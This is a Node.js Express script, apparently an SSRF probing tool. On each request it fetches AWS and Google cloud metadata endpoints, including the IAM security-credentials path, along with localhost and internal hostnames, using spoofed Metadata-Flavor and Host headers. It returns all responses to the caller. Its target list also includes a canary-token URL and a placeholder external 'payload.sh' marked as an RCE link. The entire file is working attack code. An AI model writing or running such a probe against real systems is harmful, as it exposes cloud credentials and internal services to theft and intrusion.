const express = require("express");
const axios = require("axios");
const app = express();

const PORT = 10000;

const targets = [
  "http://169.254.169.254/latest/meta-data/",
  "http://169.254.169.254/latest/user-data/",
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "http://metadata.google.internal/computeMetadata/v1/instance/id",
  "http://metadata.google.internal/computeMetadata/v1/project/project-id",
  "http://localhost/",
  "http://localhost:3000/",
  "http://127.0.0.1/",
  "http://127.0.0.1:5000/",
  "http://127.0.0.1:8080/",
  "http://internal/",
  "http://internal.website/",
  "http://docker.for.mac.localhost/",
  "http://canarytokens.com/articles/YOUR-TOKEN/contact.php",
  "http://your-external-server.com/payload.sh" // رابط RCE
];

const headersList = [
  {},
  { "Metadata-Flavor": "Google" },
  { "Host": "169.254.169.254" },
];

app.get("/", async (req, res) => {
  let results = [];

  for (let url of targets) {
    for (let headers of headersList) {
      try {
        console.log(`🚀 Trying: ${url}`);
        const response = await axios.get(url, {
          timeout: 3500,
          headers: headers,
          validateStatus: () => true,
        });
        const status = response.status;
        console.log(`✅ Status ${status}: ${url}`);
        results.push({ url, status, data: response.data });
      } catch (error) {
        console.log(`❌ FAILED: ${url} - ${error.message}`);
        results.push({ url, error: error.message });
      }
    }
  }

  res.send(`<pre>${JSON.stringify(results, null, 2)}</pre>`);
});

app.listen(PORT, () => {
  console.log(`🔥 SSRF test server running on http://localhost:${PORT}`);
});
